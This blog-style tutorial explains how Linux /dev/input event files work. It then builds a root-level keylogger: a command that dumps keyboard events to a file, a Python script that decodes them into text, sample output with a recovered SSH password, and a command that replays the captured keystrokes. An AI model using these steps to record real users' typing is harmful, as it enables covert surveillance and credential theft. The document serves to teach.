# GNU/Linux Homemade Keylogger


## A bit of context
---

GNU/Linux is one of those operating systems where, once you get the hang of it, you can't stop wanting to learn more about how it works. 

In this article, we will explore how the /dev/input directory works and what can be done with it.

## What's inside ?
---
Let's simply begin with a simple `ls` on it : 

```bash
$ ls /dev/input/
by-id    event1   event12  event15  event18  event20  event23  event3  event6  event9  mouse1
by-path  event10  event13  event16  event19  event21  event24  event4  event7  mice    mouse2
event0   event11  event14  event17  event2   event22  event25  event5  event8  mouse0
```

You'll notice that the output can be broken down into :
- by-id, by-path
- event(n)
- mice, mouse(n)

But with so many files, how do you know which one corresponds to what ? Hopefully, there are two ways to find out :

### Input device bus mapping

The below command displays relevant information about the input devices connected to your system : 

```bash
$ cat /proc/bus/input/devices

I: Bus=0003 Vendor=192f Product=0916 Version=0111
N: Name="USB Optical Mouse"
P: Phys=usb-0000:00:1d.0-1.4/input0
S: Sysfs=/devices/pci0000:00/0000:00:1d.0/usb2/2-1/2-1.4/2-1.4:1.0/input/input0
U: Uniq=
H: Handlers=mouse0 event0 
B: PROP=0
B: EV=17
B: KEY=70000 0 0 0 0
B: REL=103
B: MSC=10
 
I: Bus=0003 Vendor=05ac Product=0250 Version=0111
N: Name="Apple Inc. Apple Keyboard"
P: Phys=usb-0000:00:1d.0-1.3.4.2/input0
S: Sysfs=/devices/pci0000:00/0000:00:1d.0/usb2/2-1/2-1.3/2-1.3.4/2-1.3.4.2/2-1.3.4.2:1.0/input/input1
U: Uniq=
H: Handlers=sysrq kbd event1 
B: PROP=0
B: EV=120013
B: KEY=10000 0 0 0 1007b00001007 ff9f207ac14057ff ffbeffdfffefffff fffffffffffffffe
B: MSC=10
B: LED=1f

...
```

The key information here is the event handler of our device. For example, for the USB optical mouse, `H: Handlers` is `event0` whereas it's `event1` for the keyboard. 

With this, we can match all the event files with the corresponding device.

### Input device mapping

Another approach is to look at `/dev/input/by-id` or `/dev/input/by-path`, they have symbolic links to `/dev/input/event`. The only downside of this method is that it does not display all possible devices.

## Reading the data stream

If you want to read an event file, simply do a `cat` on it, and you will get an output similar to this : 

```bash
$ cat /dev/input/event1

DV\b�(DV\b�DV\b�EV\b�	EV\b�	EV\b�	sEV\b�Q
EV\b�Q
EV\b�Q
GV\b�
     GV\b�
          GV\b�
JV\bh�JV\bhJV\bhKV\b�	@
                     KV\b�
                          .KV\b�
                                ^C
```

Here, I chose to look at the data stream coming from my keyboard. When I typed a few characters, the binary stream appeared in my terminal, leaving this cryptic output. **_Let's decode it !_**

## Interpreting the input stream 
---

The format for the input stream is given in the official GNU/Linux documentation as follows : 

```c
struct input_event {
	struct timeval time;
	unsigned short type;
	unsigned short code;
	unsigned int value;
};
```
This output format is the same for all event files.

## Example : Homemade keylogger
---

Anyone accessing `/dev/input/*` could easily record all your keystrokes. This can quickly become a major vulnerability, as anyone could track your activity on your computer and easily retrieve all your passwords. A program that can do this remotely / automatically is called a [keylogger](https://wikipedia.org/wiki/Keylogger).

### Get access to `/dev/input/`

Since the directory is protected by default from unprivileged users, an alternative to reading event devices directly would be to use an appropriate user space API instead. 

For example, to read the keyboard, one would use ncurses, while GPM would be used to read the mouse input.

### Logging 

Let's imagine that the keyboard input stream is managed by the `event0` file. We could develop a simple keylogger as follows :

`$ sudo cat /dev/input/event0 > /tmp/keylogger.raw`

### Decoding 

Using the format of the input stream and knowing the target user keymapping we can use this python script to properly decode the input data stream : 

```python
#!/usr/bin/python3
import struct

# Mapping FR, change it accordingly to target keymap (DK, DE, US, etc.)

mapping = {16:'a', 17:'z', 18:'e', 19:'r', 20:'t', 21:'y', 22:'u', 23:'i', 24:'o', 25:'p', 30:'q', 31:'s', 32:'d',
        33:'f', 34:'g', 35:'h', 36:'j', 37:'k', 38:'l', 39:'m', 44:'w', 45:'x', 46:'c', 47:'v', 48:'b', 49:'n',
        2:'&', 3:'é', 4:'"', 5:'\'', 6:'(', 7:'-', 8:'è', 9:'_', 10:'ç', 11:'à', 12:')', 13:'=', 27:'$', 40:'ù',
        43:'*', 50:',', 51:';', 52:':', 53:'!', 35:'h', 28:'\n', 42:'<SHIFT>', 54:'<SHIFT>', 29:'<CTRL>',
        56:'<ALT>', 100:'<AltGr>', 97:'<CTRL>', 82:'0', 79:'1', 80:'2', 81:'3', 75:'4', 76:'5', 77:'6', 71:'7',
        72:'8', 73:'9', 57:' ', 86:'<', 14:'<BACKSPACE>', 15:'    ', 59:'<F1>', 60:'<F2>', 61:'<F3>', 62:'<F4>',
        63:'<F5>', 64:'<F6>', 65:'<F7>', 66:'<F8>', 67:'<F9>', 74:'-', 83:'.', 96:'\n<ENTER>', 26:'^', 1:'<ESC>',
        78:'+', 103:'<UP>'}

"""
FORMAT represents the format used by linux kernel input event struct
See https://github.com/torvalds/linux/blob/v5.5-rc5/include/uapi/linux/input.h#L28
Stands for: long int, long int, unsigned short, unsigned short, unsigned int
"""

FORMAT = 'llHHI'
EVENT_SIZE = struct.calcsize(FORMAT)

print("============== RAW ===============")
output = []
with open("/tmp/keylogger.raw", "rb") as f:
    event = f.read(EVENT_SIZE)
    while event:
        (tv_sec, tv_usec, type, code, value) = struct.unpack(FORMAT, event)
        k = ""
        if type == 1 and value != 0:
            output.append(mapping[code])
            k = mapping[code]
        print ("%s\t%s\t%s\t%s\t%s\t%s" % (tv_sec, tv_usec, type, code, value, k))

        event = f.read(EVENT_SIZE)

print("=============== DECODED ==============")
out = ''.join(output)
print(out)
```

Here's a sample output : 

```bash
$ ./keyboard.py 
============== RAW ===============	
1650296356	797828	4	4	458792	
1650296356	797828	1	28	0	
1650296356	797828	0	0	0	
1650296357	789872	4	4	458774	
1650296357	789872	1	31	1	s
1650296357	789872	0	0	0	
1650296357	821873	4	4	458774	
1650296357	821873	1	31	0	
1650296357	821873	0	0	0	
1650296357	917883	4	4	458774	
1650296357	917883	1	31	1	s
...
=============== DECODED ==============
ssh kali<AltGr>à192.168.1.254
yes
kali123!!
<CTRL>c
```
In the decoded part, we were able to successfully recover an SSH authentication (login and password). Of course, it will require an extra effort to understand all the special characters. 

For example, `<AltGr>à` means `@` in the above example, but you have the general understanding 🤠.

### Alternative way : Replay Attack


Another way to decode the keyboard data stream would be to inject the contents of `/tmp/keylogger.raw` into `/dev/input` to replay the recorded keystrokes directly into your own input stream : 

`$ sudo cat /tmp/keylogger.raw > /dev/input/event0`

I strongly recommend that you give yourself some time to open an editor (`sleep 10` ?). Don't choose nano or vim because your local editor may interpret the stream as being addressed to itself. 

{{< figure src="/images/security/linux-keylogger/pwned-small.gif" alt="denial of service attack" caption="Avoid using your terminal to decode keytrokes 😉 ">}} 

Instead, use a graphical editor like mousepad, leafpad or even gedit or kate. This way, you will see ":q" or "ctrl + x" without affecting your editor. You will then see the keystrokes magically appear on your screen.

## Because I'm not a rocket scientist, the references  

- https://www.kernel.org/doc/Documentation/input/input.txt (GNU/Linux official documentation on input)
- https://www.aldeid.com/wiki/Dev-input (for the base python script)
- https://wikipedia.org/wiki/Keylogger (for some general knownledge)

## Make a good action !
---
Hit that `CTRL + D` to bookmark this website 🔖

Internet is for sharing, so please consider sharing this post if you liked it !

It will be so much better than any newsletter #privacy #spam #planet 🌍 ❤️

